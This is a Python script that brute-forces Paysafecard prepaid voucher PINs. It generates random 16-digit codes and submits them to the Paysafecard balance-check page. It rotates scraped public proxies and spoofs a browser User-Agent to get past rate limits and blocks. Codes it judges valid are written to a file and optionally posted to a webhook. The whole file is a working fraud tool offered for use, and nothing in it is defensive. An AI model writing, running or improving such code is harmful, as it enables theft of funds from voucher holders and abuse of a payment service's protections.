import requests
from bs4 import BeautifulSoup
import random
import string
from colorama import init, Fore, Style
import os
import threading
import queue
from concurrent.futures import ThreadPoolExecutor
import time
from datetime import datetime, timedelta
from concurrent.futures import as_completed
import aiohttp
import asyncio
import re
import socket
from urllib3.exceptions import ProtocolError
from requests.exceptions import RequestException

init()

BANNER = """
                   ############                   
               ####################               
             ########################             
           ############################           
          #########            #########          
         ########                ########         
         ######                    ######         
         ######                    ######         
        ######                      ######        
        ######                      ######        
        ##   ########################   ##        
         ################################         
        ##################################        
        ##################################        
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
        ##################################        
        ##################################        
         ################################         
           #############################          
"""

# Create a small thread-safe session pool
session_pool = queue.Queue()
for _ in range(4):  # Create 4 sessions instead of 100
    session = requests.Session()
    session_pool.put(session)

# Thread-safe queue for valid codes
valid_codes_queue = queue.Queue()
attempts_counter = 0
lock = threading.Lock()

last_request_time = datetime.now()
rate_limit_delay = 1.0  # Seconds between requests

proxy_pool = queue.Queue()
PROXY_URLS = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://www.proxy-list.download/api/v1/get?type=http",
]


async def validate_proxy(session, proxy):
    """Test if proxy is working"""
    try:
        async with session.get(
            "https://www.google.com", proxy=f"http://{proxy}", timeout=5
        ) as response:
            return response.status == 200
    except:
        return False


async def fetch_proxies():
    """Asynchronously fetch and validate proxies"""
    async with aiohttp.ClientSession() as session:
        while True:
            valid_proxies = set()
            for url in PROXY_URLS:
                try:
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
                            text = await response.text()
                            proxies = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", text)

                            # Validate proxies before adding
                            tasks = [
                                validate_proxy(session, proxy) for proxy in proxies
                            ]
                            results = await asyncio.gather(
                                *tasks, return_exceptions=True
                            )
                            valid_proxies.update(
                                [
                                    proxy
                                    for proxy, is_valid in zip(proxies, results)
                                    if is_valid
                                ]
                            )
                except:
                    continue

            # Clear and refill proxy pool
            while not proxy_pool.empty():
                proxy_pool.get()
            for proxy in valid_proxies:
                proxy_pool.put(f"http://{proxy}")

            await asyncio.sleep(300)


def get_proxy():
    """Get a proxy from the pool"""
    try:
        proxy = proxy_pool.get()
        proxy_pool.put(proxy)  # Put it back for reuse
        return {"http": proxy, "https": proxy}
    except:
        return None


def get_session():
    session = session_pool.get()
    session_pool.put(session)
    return session


def check_psc_code(code):
    """Check code validity using session from pool and proxy"""
    global last_request_time, attempts_counter
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Rate limiting
            time_since_last = datetime.now() - last_request_time
            if time_since_last.total_seconds() < rate_limit_delay:
                time.sleep(rate_limit_delay - time_since_last.total_seconds())
            last_request_time = datetime.now()

            session = get_session()
            proxy = get_proxy()

            if not proxy:
                time.sleep(1)  # Wait for proxies to be available
                continue

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }

            response = session.post(
                "https://www.paysafecard.com/en/check-balance/",
                headers=headers,
                data={"pin": code, "submit": "Check balance"},
                proxies=proxy,
                timeout=10,
            )

            with lock:
                attempts_counter += 1

            response_text = response.text.lower()

            # Check for error messages
            error_messages = ["is invalid", "invalid pin", "incorrect code", "error"]
            if any(error in response_text for error in error_messages):
                return False

            # Check for success indicators
            success_indicators = ["balance", "valid", "success"]
            if any(indicator in response_text for indicator in success_indicators):
                return True

            return False

        except (
            requests.exceptions.ProxyError,
            requests.exceptions.ConnectTimeout,
            requests.exceptions.ConnectionError,
            socket.error,
            ProtocolError,
            RequestException,
        ) as e:
            retry_count += 1
            time.sleep(1)
            continue

        except Exception as e:
            with lock:
                attempts_counter += 1
            return False

    return False


def generate_and_check():
    """Worker function for threads"""
    while True:
        code = "0" + "".join(random.choices(string.digits, k=15))

        if check_psc_code(code):
            valid_codes_queue.put(code)
            print(Fore.GREEN + f"[+] VALID: {code}" + Style.RESET_ALL)

            # Save immediately to file
            with lock:
                with open("workingcodes.txt", "a") as f:
                    f.write(f"{code}\n")

            # Send webhook if configured
            if webhook_url:
                send_webhook(webhook_url, code)


def send_webhook(webhook_url, code):
    """Simplified webhook sender"""
    try:
        session = get_session()
        session.post(
            webhook_url, json={"content": f"🎉 Valid Code Found: `{code}`"}, timeout=3
        )
    except:
        pass


def main():
    os.system("cls")
    print(Fore.RED + BANNER + Style.RESET_ALL)

    global webhook_url
    webhook_url = None

    if input(Fore.YELLOW + "[?] Use webhook? (y/n): " + Style.RESET_ALL).lower() == "y":
        webhook_url = input(Fore.YELLOW + "[?] Webhook URL: " + Style.RESET_ALL)

    # Start proxy fetcher
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(fetch_proxies())

    # Use fixed number of threads
    thread_count = 4  # Fixed to 4 threads
    print(Fore.CYAN + f"[*] Starting {thread_count} threads..." + Style.RESET_ALL)

    # Start worker threads
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(
            target=generate_and_check, name=f"Worker-{i}", daemon=True
        )
        thread.start()
        threads.append(thread)

    try:
        loop.run_forever()
    except KeyboardInterrupt:
        print(
            f"\n{Fore.YELLOW}[*] Found {valid_codes_queue.qsize()} valid codes{Style.RESET_ALL}"
        )
        loop.close()


if __name__ == "__main__":
    main()
